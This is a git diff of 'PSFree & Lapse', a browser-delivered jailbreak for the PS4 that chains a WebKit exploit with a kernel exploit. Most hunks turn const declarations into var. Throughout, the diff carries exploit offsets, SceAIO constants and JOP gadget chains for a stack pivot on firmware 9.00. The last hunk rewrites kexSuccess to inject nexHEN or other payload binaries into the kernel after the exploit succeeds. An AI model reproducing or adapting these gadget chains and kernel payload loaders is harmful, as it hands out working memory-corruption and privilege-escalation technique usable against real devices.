@@ -35,21 +35,21 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // Reimplementation by Feyzee61
 // PSFree & Lapse Shared Variables & Subroutines
 
-const off_js_butterfly = 0x8;
-const off_js_inline_prop = 0x10;
-const off_view_m_vector = 0x10;
-const off_view_m_length = 0x18;
-const off_view_m_mode = 0x1c;
-const off_vector = 0x04; //off_view_m_vector / 4;
-const off_vector2 = 0x05; //(off_view_m_vector + 4) / 4;
-const off_strimpl_strlen = 4;
-const off_strimpl_m_data = 8;
-const off_strimpl_inline_str = 0x14;
-const off_size_strimpl = 0x18;
-const KB = 0x400; //1024;
-const MB = 0x100000; //KB * KB;
-const page_size = 0x4000; //16 * KB; // page size on ps4
-const is_ps4 = 1;
+var off_js_butterfly = 0x8;
+var off_js_inline_prop = 0x10;
+var off_view_m_vector = 0x10;
+var off_view_m_length = 0x18;
+var off_view_m_mode = 0x1c;
+var off_vector = 0x04; //off_view_m_vector / 4;
+var off_vector2 = 0x05; //(off_view_m_vector + 4) / 4;
+var off_strimpl_strlen = 4;
+var off_strimpl_m_data = 8;
+var off_strimpl_inline_str = 0x14;
+var off_size_strimpl = 0x18;
+var KB = 0x400; //1024;
+var MB = 0x100000; //KB * KB;
+var page_size = 0x4000; //16 * KB; // page size on ps4
+var is_ps4 = 1;
 
 var mem;
 var config_target;
@@ -630,7 +630,7 @@ class BufferView extends Uint8Array {
   }
 }
 
-const num_reuses = 0x300;
+var num_reuses = 0x300;
 
 var ssv_len;
 
@@ -1295,21 +1295,21 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * MEMLEAK - memory leaks that our code will induce
 
 // sys/mman.h
-const MAP_SHARED = 1;
-const MAP_FIXED = 0x10;
-const MAP_ANON = 0x1000;
-const MAP_PREFAULT_READ = 0x00040000;
+var MAP_SHARED = 1;
+var MAP_FIXED = 0x10;
+var MAP_ANON = 0x1000;
+var MAP_PREFAULT_READ = 0x00040000;
 // sys/rtprio.h
-const RTP_LOOKUP = 0;
-const RTP_SET = 1;
-const RTP_PRIO_ITHD = 1;
-const RTP_PRIO_REALTIME = 2;
-const RTP_PRIO_NORMAL = 3;
-const RTP_PRIO_IDLE = 4;
+var RTP_LOOKUP = 0;
+var RTP_SET = 1;
+var RTP_PRIO_ITHD = 1;
+var RTP_PRIO_REALTIME = 2;
+var RTP_PRIO_NORMAL = 3;
+var RTP_PRIO_IDLE = 4;
 //
-const PROT_READ = 0x01;
-const PROT_WRITE = 0x02;
-const PROT_EXEC = 0x04;
+var PROT_READ = 0x01;
+var PROT_WRITE = 0x02;
+var PROT_EXEC = 0x04;
 // SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
 // has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
 // group. queue 0 of each group is currently unused. queue 1 has the lowest
@@ -1322,14 +1322,14 @@ const PROT_EXEC = 0x04;
 //
 // entries on the wait queue will always have a 0 ticket number. they will
 // get assigned a nonzero ticket number once they get put on the main queue
-const AIO_CMD_READ = 1;
-const AIO_CMD_WRITE = 2;
-const AIO_CMD_FLAG_MULTI = 0x1000;
-const AIO_STATE_COMPLETE = 3;
-const AIO_STATE_ABORTED = 4;
-const num_workers = 2;
+var AIO_CMD_READ = 1;
+var AIO_CMD_WRITE = 2;
+var AIO_CMD_FLAG_MULTI = 0x1000;
+var AIO_STATE_COMPLETE = 3;
+var AIO_STATE_ABORTED = 4;
+var num_workers = 2;
 // max number of requests that can be created/polled/canceled/deleted/waited
-const max_aio_ids = 0x80;
+var max_aio_ids = 0x80;
 var off_kstr;
 var off_cpuid_to_pcpu;
 var off_sysent_661;
@@ -1707,7 +1707,7 @@ function get_gadget(map, insn_str) {
 // Chain803. Now the sequence is jop1-3 then to jop2-5.
 // When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
-const jop1 = `
+var jop1 = `
 mov rdi, qword ptr [rsi + 0x18]
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0xb8]
@@ -1718,32 +1718,32 @@ call qword ptr [rax + 0xb8]
 // extra objects between the return address and the rbp that will be pushed by
 // jop2 later. So we pop the return address pushed by jop1.
 // This will make pivoting back easy, just "leave; ret".
-const jop2 = `
+var jop2 = `
 pop rsi
 jmp qword ptr [rax + 0x1c]
 `;
-const jop3 = `
+var jop3 = `
 mov rdi, qword ptr [rax + 8]
 mov rax, qword ptr [rdi]
 jmp qword ptr [rax + 0x30]
 `;
 // rbp is now pushed, any extra objects pushed by the call instructions can be ignored
-const jop4 = `
+var jop4 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x58]
 `;
-const jop5 = `
+var jop5 = `
 mov rdx, qword ptr [rax + 0x18]
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x10]
 `;
-const jop6 = `
+var jop6 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop7 = 'pop rsp; ret';
+var jop7 = 'pop rsp; ret';
 // the ps4 firmware is compiled to use rbp as a frame pointer
 // The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
 // must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
@@ -1753,23 +1753,23 @@ const jop7 = 'pop rsp; ret';
 // leave instruction equivalent:
 //     mov rsp, rbp
 //     pop rbp
-const jop8 = `
+var jop8 = `
 mov rdi, qword ptr [rsi + 8]
 mov rax, qword ptr [rdi]
 jmp qword ptr [rax + 0x70]
 `;
-const jop9 = `
+var jop9 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x30]
 `;
-const jop10 = `
+var jop10 = `
 mov rdx, qword ptr [rdx + 0x50]
 mov ecx, 0xa
 call qword ptr [rax + 0x40]
 `;
-const jop11 = `
+var jop11 = `
 pop rsi
 cmc
 jmp qword ptr [rax + 0x7c]
@@ -2186,7 +2186,7 @@ Buffer.of = function of(...args) {
   const base = this.__proto__;
   return new this(base.of(...args).buffer);
 };
-const VariableMixin = superclass => class extends superclass {
+var VariableMixin = superclass => class extends superclass {
   constructor(value=0) {
     // unlike the View classes, we don't allow number coercion. we
     // explicitly allow floats unlike Int
@@ -2207,7 +2207,7 @@ const VariableMixin = superclass => class extends superclass {
 };
 class Word extends VariableMixin(View4) {}
 // mutable Int (we are explicitly using Int's private fields)
-const Word64Mixin = superclass => class extends superclass {
+var Word64Mixin = superclass => class extends superclass {
   constructor(...args) {
     if (!args.length) {
       return super(0);
@@ -4809,19 +4809,29 @@ async function kexSuccess() {
   if (sessionStorage.getItem('binloader')) {
     runBinLoader();
   } else {
-    let payload_path = sessionStorage.getItem("payload_path");
-    if (isPayloadElf(payload_path)) payload_path = payload_path.replace('.bin', '.elf');
-    window.log("Payload path: " + payload_path);
-
-    if (payload_path && isPayloadElf(payload_path) && payload_path.indexOf("linux") == -1) {
+    var payload_path = sessionStorage.getItem("payload_path");
+    
+    // Default HEN or nexHEN selected: load nexHEN-ps4.bin directly via kernel PayloadLoader
+    if (!payload_path || payload_path.indexOf('nexHEN') !== -1) {
+      window.log("Loading nexHEN...", "yellow");
+      var loadNexHen = await PayloadLoader('./includes/payloads/HEN/nexHEN-ps4.bin');
+      if (loadNexHen !== 1) {
+        window.log("Failed to load nexHEN!\nPlease restart console and try again...", "red");
+        return;
+      }
+      await new Promise(function(resolve) { setTimeout(resolve, 1500); });
+      window.log("\nKernel exploit succeeded!", "green");
+      window.log("nexHEN loaded successfully!", "green");
+    } else if (isPayloadElf(payload_path) && payload_path.indexOf("linux") == -1) {
+      window.log("Payload path: " + payload_path);
       // check if elfldr is listening
       var elfLoaderAvailable = await probeElfLoader();
       
       if (!elfLoaderAvailable) {
-        log("elfldr is not running, starting elfldr...", "yellow");
-        const loadElfldr = await PayloadLoader('./includes/payloads/Bins/elfldr.bin');
+        window.log("elfldr is not running, starting elfldr...", "yellow");
+        var loadElfldr = await PayloadLoader('./includes/payloads/Bins/elfldr.bin');
         if (loadElfldr !== 1) {
-          log("Failed to load elfldr!\nPlease restart console and try again...", "red");
+          window.log("Failed to load elfldr!\nPlease restart console and try again...", "red");
           return;
         }
       }
@@ -4831,14 +4841,18 @@ async function kexSuccess() {
       // Sending to elfldr
       Loadpayloadlocal(payload_path, getPayloadName(payload_path), 'jailbreak');
     } else {
-      // Inject HEN payload
-      const jb_step_status = await PayloadLoader(sessionStorage.getItem('payload_path'));
+      window.log("Payload path: " + payload_path);
+      // Inject bin payload directly into kernel
+      var jb_step_status = await PayloadLoader(payload_path);
       if (jb_step_status !== 1) {
-        window.log("Failed to load HEN!\nPlease restart console and try again...", "red");
+        window.log("Failed to load payload!\nPlease restart console and try again...", "red");
         return;
       }
-      
+      window.log("\nKernel exploit succeeded!", "green");
+      window.log("Payload loaded successfully!", "green");
     }
+
+    sessionStorage.removeItem("payload_path");
     window.log("\nPSFree & Lapse exploit with AIO fixes by ABC");
     if (typeof jailbreakSuccess === "function") {
       jailbreakSuccess();
